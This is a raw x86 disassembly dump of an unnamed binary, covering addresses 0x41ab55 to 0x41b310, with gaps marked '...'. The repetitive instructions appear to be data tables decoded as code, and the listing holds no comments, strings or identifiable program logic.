  41ab55:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab5b:	add    al,BYTE PTR [eax]
  41ab5d:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab63:	add    al,BYTE PTR [eax]
  41ab65:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab6b:	add    al,BYTE PTR [eax]
  41ab6d:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab73:	add    al,BYTE PTR [eax]
  41ab75:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab7b:	add    al,BYTE PTR [eax]
  41ab7d:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab83:	add    al,BYTE PTR [eax]
  41ab85:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab8b:	add    al,BYTE PTR [eax]
  41ab8d:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab93:	add    al,BYTE PTR [eax]
  41ab95:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab9b:	add    al,BYTE PTR [eax]
	...
  41abb1:	add    BYTE PTR [eax],al
  41abb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abb4:	add    al,BYTE PTR [eax]
  41abb6:	add    BYTE PTR [edi-0x58fffffe],ah
  41abbc:	add    al,BYTE PTR [eax]
  41abbe:	add    BYTE PTR [edi-0x58fffffe],ah
  41abc4:	add    al,BYTE PTR [eax]
  41abc6:	add    BYTE PTR [edi-0x58fffffe],ah
  41abcc:	add    al,BYTE PTR [eax]
  41abce:	add    BYTE PTR [edi-0x58fffffe],ah
  41abd4:	add    al,BYTE PTR [eax]
  41abd6:	add    BYTE PTR [edi-0x58fffffe],ah
  41abdc:	add    al,BYTE PTR [eax]
  41abde:	add    BYTE PTR [edi-0x58fffffe],ah
  41abe4:	add    al,BYTE PTR [eax]
  41abe6:	add    BYTE PTR [edi-0x58fffffe],ah
  41abec:	add    al,BYTE PTR [eax]
  41abee:	add    BYTE PTR [edi-0x58fffffe],ah
  41abf4:	add    al,BYTE PTR [eax]
  41abf6:	add    BYTE PTR [edi-0x58fffffe],ah
  41abfc:	add    al,BYTE PTR [eax]
  41abfe:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac04:	add    al,BYTE PTR [eax]
  41ac06:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac0c:	add    al,BYTE PTR [eax]
  41ac0e:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac14:	add    al,BYTE PTR [eax]
	...
  41ac2a:	add    BYTE PTR [eax],al
  41ac2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac2d:	add    al,BYTE PTR [eax]
  41ac2f:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac35:	add    al,BYTE PTR [eax]
  41ac37:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac3d:	add    al,BYTE PTR [eax]
  41ac3f:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac45:	add    al,BYTE PTR [eax]
  41ac47:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac4d:	add    al,BYTE PTR [eax]
  41ac4f:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac55:	add    al,BYTE PTR [eax]
  41ac57:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac5d:	add    al,BYTE PTR [eax]
  41ac5f:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac65:	add    al,BYTE PTR [eax]
  41ac67:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac6d:	add    al,BYTE PTR [eax]
  41ac6f:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac75:	add    al,BYTE PTR [eax]
  41ac77:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac7d:	add    al,BYTE PTR [eax]
  41ac7f:	add    BYTE PTR [edi-0x58fffffe],ah
  41ac85:	add    al,BYTE PTR [eax]
  41ac87:	add    BYTE PTR [edi+0x2],ah
  41ac8d:	add    al,BYTE PTR [eax]
  41ac8f:	add    BYTE PTR [edi-0x50fffffe],ah
  41ac95:	add    al,BYTE PTR [eax]
  41ac97:	add    BYTE PTR [ebx],bl
  41ac99:	xor    BYTE PTR [eax-0x67cfe4ce],dl
  41ac9f:	xor    bl,BYTE PTR [ebx]
  41aca1:	xor    BYTE PTR [eax-0x57cff4ce],ah
  41aca7:	xor    ah,BYTE PTR [edi+0x77000142]
  41acad:	add    al,BYTE PTR [eax]
  41acaf:	add    BYTE PTR [eax+edi*1],al
  41acb2:	dec    ebx
  41acb3:	cmp    esi,DWORD PTR [edi+0x39]
  41acb6:	pop    edx
  41acb7:	cmp    ebp,DWORD PTR [eax+0x39]
  41acba:	push   0x9339913b
  41acbf:	cmp    ebx,DWORD PTR [ecx]
  41acc1:	cmp    DWORD PTR [eax-0x12c714c5],ebp
  41acc7:	cmp    ebx,DWORD PTR [esi+edi*1+0x3ebe3c11]
  41acce:	popf   
  41accf:	cmp    al,0x3
  41acd1:	aas    
  41acd2:	xchg   DWORD PTR [esi],edi
  41acd4:	and    bh,BYTE PTR [edx*4-0x32c41cc2]
  41acdb:	ds enter 0x7e3b,0x3f
  41ace0:	and    al,0x3d
  41ace2:	fwait
  41ace3:	aas    
  41ace4:	(bad)  
  41ace5:	cmp    al,0xaf
  41ace7:	aas    
  41ace8:	call   0x75817929
  41aced:	cmp    al,0xe6
  41acef:	aas    
  41acf0:	xchg   esi,eax
  41acf1:	cmp    al,0xf9
  41acf3:	aas    
	...
  41ad08:	add    BYTE PTR [eax-0x58ffffc4],dl
  41ad0e:	push   edx
  41ad0f:	add    DWORD PTR [eax],eax
  41ad11:	cmp    eax,DWORD PTR [ebx]
  41ad13:	add    BYTE PTR [eax],al
  41ad15:	mov    ds:0x26301832,al
  41ad1a:	xor    eax,DWORD PTR [edi+0x4b31e130]
  41ad20:	xor    DWORD PTR [edx],eax
  41ad22:	xor    ah,BYTE PTR [esi+0x31]
  41ad25:	xlat   BYTE PTR ds:[ebx]
  41ad26:	xor    DWORD PTR [ebp-0x55cdf4cf],ecx
  41ad2c:	xor    DWORD PTR [ebp+0x32],esp
  41ad2f:	in     eax,0x31
  41ad31:	xchg   esi,eax
  41ad32:	xor    BYTE PTR [ecx],bl
  41ad34:	xor    bl,BYTE PTR [eax+0x73322630]
  41ad3a:	xor    BYTE PTR [ebp+0x32],al
  41ad3d:	fdiv   QWORD PTR [eax]
  41ad3f:	push   ebx
  41ad40:	xor    bh,BYTE PTR [ebp+0x30]
  41ad43:	popa   
  41ad44:	xor    cl,BYTE PTR [eax+0x2a327f30]
  41ad4a:	xor    DWORD PTR [edi-0x54ceb9ce],edx
  41ad50:	xor    bh,BYTE PTR [esi]
  41ad52:	xor    ebx,eax
  41ad54:	xor    dl,dh
  41ad56:	xor    BYTE PTR [eax],cl
  41ad58:	xor    esp,DWORD PTR [ecx-0x3dccebd1]
  41ad5e:	das    
  41ad5f:	sub    dh,BYTE PTR [ebx]
  41ad61:	gs das 
  41ad63:	jle    0x41ad98
  41ad65:	das    
  41ad66:	xor    BYTE PTR [ebp-0x54cff9cd],dl
  41ad6c:	xor    eax,DWORD PTR [eax]
	...
  41ad82:	adc    esi,DWORD PTR [eax]
  41ad84:	mov    esi,0xce2fee33
  41ad89:	xor    edx,ebx
  41ad8b:	das    
  41ad8c:	fnsave [ebx]
  41ad8e:	shr    BYTE PTR [edi],0xf4
  41ad91:	xor    ebp,DWORD PTR [ebp-0x55cc00d1]
  41ad97:	or     DWORD PTR ss:[ecx+ebp*4],esi
  41ad9b:	ss adc al,0x34
  41ad9e:	lds    esi,FWORD PTR [esi]
  41ada0:	sub    BYTE PTR [edx+edi*4],dh
  41ada3:	xor    dh,BYTE PTR ss:[eax+esi*8]
  41ada7:	ss pop edx
  41ada9:	xor    al,0x21
  41adab:	mov    WORD PTR ss:[edx*1+0x61349c36],?
  41adb3:	ss jmp 0x41adea
  41adb6:	pop    edi
  41adb7:	ss or  al,0x35
  41adba:	mov    cl,0x35
  41adbc:	and    esi,DWORD PTR ds:0x3531357e
  41adc2:	mov    ?,WORD PTR ds:0x35f33544
  41adc8:	pop    ebp
  41adc9:	xor    eax,0x357135c5
  41adce:	sub    dh,BYTE PTR ds:0x3511358e
  41add4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41add5:	xor    eax,0x2a7
  41adda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41addb:	add    al,BYTE PTR [eax]
  41addd:	add    BYTE PTR [edi-0x58fffffe],ah
  41ade3:	add    al,BYTE PTR [eax]
	...
  41adf9:	add    BYTE PTR [eax],al
  41adfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adfc:	add    al,BYTE PTR [eax]
  41adfe:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae04:	add    al,BYTE PTR [eax]
  41ae06:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae0c:	add    al,BYTE PTR [eax]
  41ae0e:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae14:	add    al,BYTE PTR [eax]
  41ae16:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae1c:	add    al,BYTE PTR [eax]
  41ae1e:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae24:	add    al,BYTE PTR [eax]
  41ae26:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae2c:	add    al,BYTE PTR [eax]
  41ae2e:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae34:	add    al,BYTE PTR [eax]
  41ae36:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae3c:	add    al,BYTE PTR [eax]
  41ae3e:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae44:	add    al,BYTE PTR [eax]
  41ae46:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae4c:	add    al,BYTE PTR [eax]
  41ae4e:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae54:	add    al,BYTE PTR [eax]
  41ae56:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae5c:	add    al,BYTE PTR [eax]
	...
  41ae72:	add    BYTE PTR [eax],al
  41ae74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae75:	add    al,BYTE PTR [eax]
  41ae77:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae7d:	add    al,BYTE PTR [eax]
  41ae7f:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae85:	add    al,BYTE PTR [eax]
  41ae87:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae8d:	add    al,BYTE PTR [eax]
  41ae8f:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae95:	add    al,BYTE PTR [eax]
  41ae97:	add    BYTE PTR [edi-0x58fffffe],ah
  41ae9d:	add    al,BYTE PTR [eax]
  41ae9f:	add    BYTE PTR [edi-0x58fffffe],ah
  41aea5:	add    al,BYTE PTR [eax]
  41aea7:	add    BYTE PTR [edi-0x58fffffe],ah
  41aead:	add    al,BYTE PTR [eax]
  41aeaf:	add    BYTE PTR [edi-0x58fffffe],ah
  41aeb5:	add    al,BYTE PTR [eax]
  41aeb7:	add    BYTE PTR [edi-0x58fffffe],ah
  41aebd:	add    al,BYTE PTR [eax]
  41aebf:	add    BYTE PTR [edi-0x58fffffe],ah
  41aec5:	add    al,BYTE PTR [eax]
  41aec7:	add    BYTE PTR [edi-0x58fffffe],ah
  41aecd:	add    al,BYTE PTR [eax]
  41aecf:	add    BYTE PTR [edi-0x58fffffe],ah
  41aed5:	add    al,BYTE PTR [eax]
	...
  41aeeb:	add    BYTE PTR [eax],al
  41aeed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeee:	add    al,BYTE PTR [eax]
  41aef0:	add    BYTE PTR [edi-0x58fffffe],ah
  41aef6:	add    al,BYTE PTR [eax]
  41aef8:	add    BYTE PTR [edx+ebx*8-0x254fffbf],ch
  41aeff:	inc    ecx
  41af00:	add    BYTE PTR [edx+ebx*8-0x2547ffbf],dh
  41af07:	inc    ecx
  41af08:	add    BYTE PTR [edx+ebx*8-0x253fffbf],bh
  41af0f:	inc    ecx
  41af10:	add    ah,al
  41af12:	fiadd  DWORD PTR [ecx+0x0]
  41af15:	enter  0x41da,0x0
  41af19:	int3   
  41af1a:	fiadd  DWORD PTR [ecx+0x0]
  41af1d:	rcr    dl,1
  41af1f:	inc    ecx
  41af20:	add    ah,dl
  41af22:	fiadd  DWORD PTR [ecx+0x0]
  41af25:	fcomp  st(2)
  41af27:	inc    ecx
  41af28:	add    ah,bl
  41af2a:	fiadd  DWORD PTR [ecx+0x0]
  41af2d:	loopne 0x41af09
  41af2f:	inc    ecx
  41af30:	add    ah,ah
  41af32:	fiadd  DWORD PTR [ecx+0x0]
  41af35:	call   0xec41f114
  41af3a:	fiadd  DWORD PTR [ecx+0x0]
  41af3d:	lock fiadd DWORD PTR [ecx+0x0]
  41af41:	hlt    
  41af42:	fiadd  DWORD PTR [ecx+0x0]
  41af45:	clc    
  41af46:	fiadd  DWORD PTR [ecx+0x0]
  41af49:	cld    
  41af4a:	fiadd  DWORD PTR [ecx+0x0]
  41af4d:	add    bl,bl
  41af4f:	inc    ecx
  41af50:	add    BYTE PTR [ebx+ebx*8],al
  41af53:	inc    ecx
  41af54:	add    BYTE PTR [eax],cl
  41af56:	fild   DWORD PTR [ecx+0x0]
  41af59:	or     al,0xdb
  41af5b:	inc    ecx
  41af5c:	add    BYTE PTR [eax],dl
  41af5e:	fild   DWORD PTR [ecx+0x0]
  41af61:	adc    al,0xdb
  41af63:	inc    ecx
  41af64:	add    BYTE PTR [eax],bl
  41af66:	fild   DWORD PTR [ecx+0x0]
  41af69:	sbb    al,0xdb
  41af6b:	inc    ecx
  41af6c:	add    BYTE PTR [eax],ah
  41af6e:	fild   DWORD PTR [ecx+0x0]
  41af71:	and    al,0xdb
  41af73:	inc    ecx
  41af74:	add    BYTE PTR [eax],ch
  41af76:	fild   DWORD PTR [ecx+0x0]
  41af79:	sub    al,0xdb
  41af7b:	inc    ecx
  41af7c:	add    BYTE PTR [eax],dh
  41af7e:	fild   DWORD PTR [ecx+0x0]
  41af81:	xor    al,0xdb
  41af83:	inc    ecx
  41af84:	add    BYTE PTR [eax],bh
  41af86:	fild   DWORD PTR [ecx+0x0]
  41af89:	cmp    al,0xdb
  41af8b:	inc    ecx
  41af8c:	add    BYTE PTR [eax-0x25],al
  41af8f:	inc    ecx
  41af90:	add    BYTE PTR [ebx+ebx*8+0x41],al
  41af94:	add    BYTE PTR [edx+ebx*8-0x24b7ffbf],ch
  41af9b:	inc    ecx
  41af9c:	add    BYTE PTR [ebx+ebx*8+0x41],cl
  41afa0:	add    BYTE PTR [eax-0x25],dl
  41afa3:	inc    ecx
  41afa4:	add    BYTE PTR [ebx+ebx*8+0x41],dl
  41afa8:	add    BYTE PTR [eax-0x25],bl
  41afab:	inc    ecx
  41afac:	add    BYTE PTR [ebx+ebx*8+0x41],bl
  41afb0:	add    BYTE PTR [eax-0x25],ah
  41afb3:	inc    ecx
  41afb4:	add    BYTE PTR [ebx+ebx*8+0x41],ah
  41afb8:	add    BYTE PTR [eax-0x25],ch
  41afbb:	inc    ecx
  41afbc:	add    BYTE PTR [ebx+ebx*8+0x41],ch
  41afc0:	add    BYTE PTR [eax-0x25],dh
  41afc3:	inc    ecx
  41afc4:	add    BYTE PTR [ebx+ebx*8+0x41],dh
  41afc8:	add    BYTE PTR [eax-0x25],bh
  41afcb:	inc    ecx
  41afcc:	add    BYTE PTR [ebx+ebx*8+0x41],bh
  41afd0:	add    BYTE PTR [eax-0x7bffbe25],al
  41afd6:	fild   DWORD PTR [ecx+0x0]
  41afd9:	mov    bl,bl
  41afdb:	inc    ecx
  41afdc:	add    BYTE PTR [ebx+ebx*8-0x246fffbf],cl
  41afe3:	inc    ecx
  41afe4:	add    BYTE PTR [ebx+ebx*8-0x2467ffbf],dl
  41afeb:	inc    ecx
  41afec:	add    BYTE PTR [ebx+ebx*8-0x245fffbf],bl
  41aff3:	inc    ecx
  41aff4:	add    BYTE PTR [ebx+ebx*8-0x2457ffbf],ah
  41affb:	inc    ecx
  41affc:	add    BYTE PTR [ebx+ebx*8-0x244fffbf],ch
  41b003:	inc    ecx
  41b004:	add    BYTE PTR [ebx+ebx*8-0x2447ffbf],dh
  41b00b:	inc    ecx
  41b00c:	add    BYTE PTR [ebx+ebx*8-0x243fffbf],bh
  41b013:	inc    ecx
  41b014:	add    ah,al
  41b016:	fild   DWORD PTR [ecx+0x0]
  41b019:	enter  0x41db,0x0
  41b01d:	int3   
  41b01e:	fild   DWORD PTR [ecx+0x0]
  41b021:	rcr    bl,1
  41b023:	inc    ecx
  41b024:	add    ah,dl
  41b026:	fild   DWORD PTR [ecx+0x0]
  41b029:	fcomp  st(3)
  41b02b:	inc    ecx
  41b02c:	add    ah,bl
  41b02e:	fild   DWORD PTR [ecx+0x0]
  41b031:	loopne 0x41b00e
  41b033:	inc    ecx
  41b034:	add    ah,ah
  41b036:	fild   DWORD PTR [ecx+0x0]
  41b039:	call   0xec41f219
  41b03e:	fild   DWORD PTR [ecx+0x0]
  41b041:	lock fild DWORD PTR [ecx+0x0]
  41b045:	aam    0xdb
  41b047:	inc    ecx
  41b048:	add    ah,dh
  41b04a:	fild   DWORD PTR [ecx+0x0]
  41b04d:	clc    
  41b04e:	fild   DWORD PTR [ecx+0x0]
  41b051:	pushf  
  41b052:	fild   DWORD PTR [ecx+0x0]
  41b055:	cld    
  41b056:	fild   DWORD PTR [ecx+0x0]
  41b059:	add    ah,bl
  41b05b:	inc    ecx
  41b05c:	add    BYTE PTR [esp+ebx*8],al
  41b05f:	inc    ecx
  41b060:	add    BYTE PTR [ebx+ebx*8],ch
  41b063:	inc    ecx
  41b064:	add    BYTE PTR [eax],cl
  41b066:	fadd   QWORD PTR [ecx+0x0]
  41b069:	cwde   
  41b06a:	fild   DWORD PTR [ecx+0x0]
  41b06d:	or     al,0xdc
  41b06f:	inc    ecx
  41b070:	add    BYTE PTR [eax],dl
  41b072:	fadd   QWORD PTR [ecx+0x0]
  41b075:	sub    al,0xdb
  41b077:	inc    ecx
  41b078:	add    BYTE PTR [esp+ebx*8],dl
  41b07b:	inc    ecx
  41b07c:	add    BYTE PTR [eax],bl
  41b07e:	fadd   QWORD PTR [ecx+0x0]
  41b081:	(bad)  
  41b083:	inc    ecx
  41b084:	add    BYTE PTR [esp+ebx*8],bl
  41b087:	inc    ecx
  41b088:	add    BYTE PTR [eax],ah
  41b08a:	fadd   QWORD PTR [ecx+0x0]
  41b08d:	and    ah,bl
  41b08f:	inc    ecx
  41b090:	add    BYTE PTR [esp+ebx*8],ah
  41b093:	inc    ecx
  41b094:	add    BYTE PTR [eax],ch
  41b096:	fadd   QWORD PTR [ecx+0x0]
  41b099:	sub    al,0xdc
  41b09b:	inc    ecx
  41b09c:	add    BYTE PTR [eax],dh
  41b09e:	fadd   QWORD PTR [ecx+0x0]
  41b0a1:	xor    al,0xdc
  41b0a3:	inc    ecx
  41b0a4:	add    BYTE PTR [ebx+ebx*8],cl
  41b0a7:	inc    ecx
  41b0a8:	add    BYTE PTR [eax],bh
  41b0aa:	fadd   QWORD PTR [ecx+0x0]
  41b0ad:	cmp    al,0xdc
  41b0af:	inc    ecx
  41b0b0:	add    BYTE PTR [eax-0x24],al
  41b0b3:	inc    ecx
  41b0b4:	add    BYTE PTR [esp+ebx*8+0x41],al
  41b0b8:	add    BYTE PTR [eax-0x24],cl
  41b0bb:	inc    ecx
  41b0bc:	add    BYTE PTR [esp+ebx*8+0x41],cl
  41b0c0:	add    BYTE PTR [eax-0x24],dl
  41b0c3:	inc    ecx
  41b0c4:	add    BYTE PTR [esp+ebx*8+0x41],dl
  41b0c8:	add    BYTE PTR [eax-0x24],bl
  41b0cb:	inc    ecx
  41b0cc:	add    BYTE PTR [eax],al
  41b0ce:	fild   DWORD PTR [ecx+0x0]
  41b0d1:	pop    esp
  41b0d2:	fadd   QWORD PTR [ecx+0x0]
  41b0d5:	and    bl,bl
  41b0d7:	inc    ecx
  41b0d8:	add    BYTE PTR [eax-0x24],ah
  41b0db:	inc    ecx
  41b0dc:	add    BYTE PTR [esp+ebx*8+0x41],ah
  41b0e0:	add    ah,ah
  41b0e2:	fiadd  DWORD PTR [ecx+0x0]
  41b0e5:	push   0x6c0041dc
  41b0ea:	fadd   QWORD PTR [ecx+0x0]
  41b0ed:	jo     0x41b0cb
  41b0ef:	inc    ecx
  41b0f0:	add    BYTE PTR [esp+ebx*8+0x41],dh
  41b0f4:	add    BYTE PTR [eax-0x24],bh
  41b0f7:	inc    ecx
  41b0f8:	add    BYTE PTR [esp+ebx*8+0x41],bh
  41b0fc:	add    BYTE PTR [eax-0x7bffbe24],al
  41b102:	fadd   QWORD PTR [ecx+0x0]
  41b105:	mov    ah,bl
  41b107:	inc    ecx
  41b108:	add    BYTE PTR [esp+ebx*8-0x236fffbf],cl
  41b10f:	inc    ecx
  41b110:	add    BYTE PTR [esp+ebx*8-0x253fffbf],dl
  41b117:	inc    ecx
  41b118:	add    BYTE PTR [eax-0x63ffbe24],bl
  41b11e:	fadd   QWORD PTR [ecx+0x0]
  41b121:	mov    al,ds:0xa40041dc
  41b126:	fadd   QWORD PTR [ecx+0x0]
  41b129:	test   al,0xdc
  41b12b:	inc    ecx
  41b12c:	add    ah,bh
  41b12e:	fild   DWORD PTR [ecx+0x0]
  41b131:	lods   al,BYTE PTR ds:[esi]
  41b132:	fadd   QWORD PTR [ecx+0x0]
  41b135:	mov    al,0xdc
  41b137:	inc    ecx
  41b138:	add    BYTE PTR [esp+ebx*8-0x2347ffbf],dh
  41b13f:	inc    ecx
  41b140:	add    BYTE PTR [esp+ebx*8-0x233fffbf],bh
  41b147:	inc    ecx
  41b148:	add    ah,al
  41b14a:	fadd   QWORD PTR [ecx+0x0]
  41b14d:	(bad)  
  41b14f:	inc    ecx
  41b150:	add    al,cl
  41b152:	fadd   QWORD PTR [ecx+0x0]
  41b155:	int3   
  41b156:	fadd   QWORD PTR [ecx+0x0]
  41b159:	xchg   esp,eax
  41b15a:	fadd   QWORD PTR [ecx+0x0]
  41b15d:	int3   
  41b15e:	fild   DWORD PTR [ecx+0x0]
  41b161:	rcr    ah,1
  41b163:	inc    ecx
  41b164:	add    ah,dl
  41b166:	fadd   QWORD PTR [ecx+0x0]
  41b169:	fcomp  st(4)
  41b16b:	inc    ecx
  41b16c:	add    ah,bl
  41b16e:	fadd   QWORD PTR [ecx+0x0]
  41b171:	loopne 0x41b14f
  41b173:	inc    ecx
  41b174:	add    ah,ah
  41b176:	fadd   QWORD PTR [ecx+0x0]
  41b179:	call   0xec41f35a
  41b17e:	fadd   QWORD PTR [ecx+0x0]
  41b181:	in     al,dx
  41b182:	loopne 0x41b1c5
  41b184:	add    al,dh
  41b186:	loopne 0x41b1c9
  41b188:	add    ah,dh
  41b18a:	loopne 0x41b1cd
  41b18c:	add    al,bh
  41b18e:	loopne 0x41b1d1
  41b190:	add    ah,bh
  41b192:	loopne 0x41b1d5
  41b194:	add    BYTE PTR [eax],al
  41b196:	loope  0x41b1d9
  41b198:	add    BYTE PTR [ecx+eiz*8],al
  41b19b:	inc    ecx
  41b19c:	add    BYTE PTR [eax],cl
  41b19e:	loope  0x41b1e1
  41b1a0:	add    BYTE PTR [ecx+eiz*8],cl
  41b1a3:	inc    ecx
  41b1a4:	add    BYTE PTR [eax],dl
  41b1a6:	loope  0x41b1e9
  41b1a8:	add    BYTE PTR [eax],cl
  41b1aa:	loope  0x41b1ed
  41b1ac:	add    BYTE PTR [ecx+eiz*8],dl
  41b1af:	inc    ecx
  41b1b0:	add    BYTE PTR [eax],bl
  41b1b2:	loope  0x41b1f5
  41b1b4:	add    BYTE PTR [ecx+eiz*8],bl
  41b1b7:	inc    ecx
  41b1b8:	add    BYTE PTR [ecx+eiz*8],al
  41b1bb:	inc    ecx
  41b1bc:	add    BYTE PTR [eax],ah
  41b1be:	loope  0x41b201
  41b1c0:	add    BYTE PTR [ecx+eiz*8],ah
  41b1c3:	inc    ecx
  41b1c4:	add    BYTE PTR [eax],ch
  41b1c6:	loope  0x41b209
  41b1c8:	add    BYTE PTR [ecx+eiz*8],ch
  41b1cb:	inc    ecx
  41b1cc:	add    BYTE PTR [eax],dh
  41b1ce:	loope  0x41b211
  41b1d0:	add    BYTE PTR [ecx+eiz*8],dh
  41b1d3:	inc    ecx
  41b1d4:	add    BYTE PTR [eax],bh
  41b1d6:	loope  0x41b219
  41b1d8:	add    BYTE PTR [ecx+eiz*8],bh
  41b1db:	inc    ecx
  41b1dc:	add    BYTE PTR [eax-0x1f],al
  41b1df:	inc    ecx
  41b1e0:	add    BYTE PTR [ecx+eiz*8+0x41],al
  41b1e4:	add    BYTE PTR [eax-0x1f],cl
  41b1e7:	inc    ecx
  41b1e8:	add    BYTE PTR [ecx+eiz*8+0x41],cl
  41b1ec:	add    BYTE PTR [eax-0x1f],dl
  41b1ef:	inc    ecx
  41b1f0:	add    BYTE PTR [ecx+eiz*8+0x41],dl
  41b1f4:	add    BYTE PTR [eax-0x1f],bl
  41b1f7:	inc    ecx
  41b1f8:	add    BYTE PTR [ecx+eiz*8+0x41],bl
  41b1fc:	add    BYTE PTR [eax-0x1f],ah
  41b1ff:	inc    ecx
  41b200:	add    BYTE PTR [ecx+eiz*8+0x41],ah
  41b204:	add    BYTE PTR [eax-0x1f],ch
  41b207:	inc    ecx
  41b208:	add    BYTE PTR [ecx+eiz*8+0x41],ch
  41b20c:	add    BYTE PTR [eax-0x1f],dh
  41b20f:	inc    ecx
  41b210:	add    BYTE PTR [ecx+eiz*8+0x41],dh
  41b214:	add    BYTE PTR [eax-0x1f],bh
  41b217:	inc    ecx
  41b218:	add    BYTE PTR [ecx+eiz*8+0x41],bh
  41b21c:	add    BYTE PTR [eax-0x7bffbe1f],al
  41b222:	loope  0x41b265
  41b224:	add    BYTE PTR [eax-0x73ffbe1f],cl
  41b22a:	loope  0x41b26d
  41b22c:	add    BYTE PTR [eax-0x6bffbe1f],dl
  41b232:	loope  0x41b275
  41b234:	add    BYTE PTR [eax-0x63ffbe1f],bl
  41b23a:	loope  0x41b27d
  41b23c:	add    BYTE PTR [eax-0x5bffbe1f],ah
  41b242:	loope  0x41b285
  41b244:	add    BYTE PTR [eax-0x53ffbe1f],ch
  41b24a:	loope  0x41b28d
  41b24c:	add    BYTE PTR [eax-0x4bffbe1f],dh
  41b252:	loope  0x41b295
  41b254:	add    BYTE PTR [eax-0x43ffbe1f],bh
  41b25a:	loope  0x41b29d
  41b25c:	add    al,al
  41b25e:	loope  0x41b2a1
  41b260:	add    BYTE PTR [ecx+eiz*8-0x1e3bffbf],bh
  41b267:	inc    ecx
  41b268:	add    al,cl
  41b26a:	loope  0x41b2ad
  41b26c:	add    ah,cl
  41b26e:	loope  0x41b2b1
  41b270:	add    al,dl
  41b272:	loope  0x41b2b5
  41b274:	add    ah,dl
  41b276:	loope  0x41b2b9
  41b278:	add    BYTE PTR [eax-0x1f],al
  41b27b:	inc    ecx
  41b27c:	add    al,bl
  41b27e:	loope  0x41b2c1
  41b280:	add    ah,bl
  41b282:	loope  0x41b2c5
  41b284:	add    al,ah
  41b286:	loope  0x41b2c9
  41b288:	add    ah,ah
  41b28a:	loope  0x41b2cd
  41b28c:	add    ah,ch
  41b28e:	loopne 0x41b2d1
  41b290:	add    al,ch
  41b292:	loope  0x41b2d5
  41b294:	add    BYTE PTR [eax-0xbffbe1f],dl
  41b29a:	loopne 0x41b2dd
  41b29c:	add    ah,ch
  41b29e:	loope  0x41b2e1
  41b2a0:	add    al,dh
  41b2a2:	loope  0x41b2e5
  41b2a4:	add    ah,dh
  41b2a6:	loope  0x41b2e9
  41b2a8:	add    al,bh
  41b2aa:	loope  0x41b2ed
  41b2ac:	add    ah,bh
  41b2ae:	loope  0x41b2f1
  41b2b0:	add    BYTE PTR [eax],al
  41b2b2:	loop   0x41b2f5
  41b2b4:	add    BYTE PTR [eax-0x1f],bh
  41b2b7:	inc    ecx
  41b2b8:	add    BYTE PTR [edx+eiz*8],al
  41b2bb:	inc    ecx
  41b2bc:	add    BYTE PTR [eax],cl
  41b2be:	loop   0x41b301
  41b2c0:	add    BYTE PTR [edx+eiz*8],cl
  41b2c3:	inc    ecx
  41b2c4:	add    ah,ch
  41b2c6:	loope  0x41b309
  41b2c8:	add    BYTE PTR [eax],dl
  41b2ca:	loop   0x41b30d
  41b2cc:	add    BYTE PTR [edx+eiz*8],dl
  41b2cf:	inc    ecx
  41b2d0:	add    al,ch
  41b2d2:	loope  0x41b315
  41b2d4:	add    BYTE PTR [ecx+eiz*8+0x41],ah
  41b2d8:	add    ah,bl
  41b2da:	loope  0x41b31d
  41b2dc:	add    BYTE PTR [eax],bl
  41b2de:	loop   0x41b321
  41b2e0:	add    BYTE PTR [edx+eiz*8],bl
  41b2e3:	inc    ecx
  41b2e4:	add    BYTE PTR [eax],ah
  41b2e6:	loop   0x41b329
  41b2e8:	add    BYTE PTR [edx+eiz*8],ah
  41b2eb:	inc    ecx
  41b2ec:	add    BYTE PTR [eax],ch
  41b2ee:	loop   0x41b331
  41b2f0:	add    BYTE PTR [edx+eiz*8],ch
  41b2f3:	inc    ecx
  41b2f4:	add    BYTE PTR [eax],dh
  41b2f6:	loop   0x41b339
  41b2f8:	add    BYTE PTR [edx+eiz*8],dh
  41b2fb:	inc    ecx
  41b2fc:	add    BYTE PTR [eax],bh
  41b2fe:	loop   0x41b341
  41b300:	add    BYTE PTR [edx+eiz*8],bh
  41b303:	inc    ecx
  41b304:	add    ah,dh
  41b306:	loopne 0x41b349
  41b308:	add    al,dh
  41b30a:	loope  0x41b34d
  41b30c:	add    BYTE PTR [edx+eiz*8],al
  41b30f:	inc    ecx
  41b310:	add    BYTE PTR [eax-0x1e],al
